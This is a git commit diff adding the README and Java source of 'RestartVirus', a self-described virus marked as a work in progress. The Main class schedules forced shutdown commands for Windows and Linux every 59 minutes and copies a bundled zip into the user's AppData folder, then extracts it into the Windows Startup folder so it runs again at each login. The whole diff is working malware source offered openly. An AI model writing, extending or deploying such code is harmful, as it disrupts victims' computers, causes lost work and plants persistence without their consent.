4686289ca4c409aa6f3cad9c26d558ea51291564
MOMIN5 <drmine05@gmail.com>
2021-01-29 14:40:34 +0530

    added a lot of stuff

--- README.md
+++ README.md
@@ -1,3 +1,2 @@
 # RestartVirus in Java
 A virus that should restart your pc every hour, currently WIP and not ready
-
---
+++ src/main/java/in/momin5/restartvirus/Main.java
@@ -0,0 +1,59 @@
+package in.momin5.restartvirus;
+
+
+import net.lingala.zip4j.ZipFile;
+import org.apache.commons.io.IOUtils;
+
+
+import java.io.*;
+import java.util.Timer;
+import java.util.TimerTask;
+
+/*
+written by Momin5 :sunglasses:
+https://github.com/MOMIN5
+im also using a zip library called zip4j cause i couldnt figure out how to make files extract to paths using just java
+ */
+public class Main {
+
+    public static void main(String[] args) throws Exception {
+        timer();
+        extract();
+        System.out.println("Should shutdown computer in 1 hour, https://github.com/MOMIN5/restart-virus-java ");
+    }
+    public static void timer() {
+        Timer timer = new Timer();
+
+        timer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                try{
+                    Runtime.getRuntime().exec("shutdown.exe -s -t 0"); //executes if windows
+                    Runtime.getRuntime().exec("shutdown -h now"); // executes if linux
+                }
+                catch (IOException a){ // since it throws exceptions catch it
+                    System.out.println(a);
+                }
+            }
+        }, 59*60*1000, 59*60*1000 ); // timer executes after 59 minutes
+    }
+
+    public static void extract() throws IOException{
+
+        InputStream is = Main.class.getClassLoader().getResourceAsStream("e.zip");
+        File file = new File(System.getProperty("user.home")+ "\\AppData\\Roaming\\Microsoft\\Main");
+        try(OutputStream outputStream = new FileOutputStream(file)){
+            IOUtils.copy(is, outputStream);
+        }catch (FileNotFoundException w){
+        }catch (IOException s){
+        }
+
+        String infectPathWindows = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //will make a folder if it doesnt exist
+
+        ZipFile z1 = new ZipFile(file);
+        z1.extractAll(infectPathWindows);
+
+    }
+}
+
+
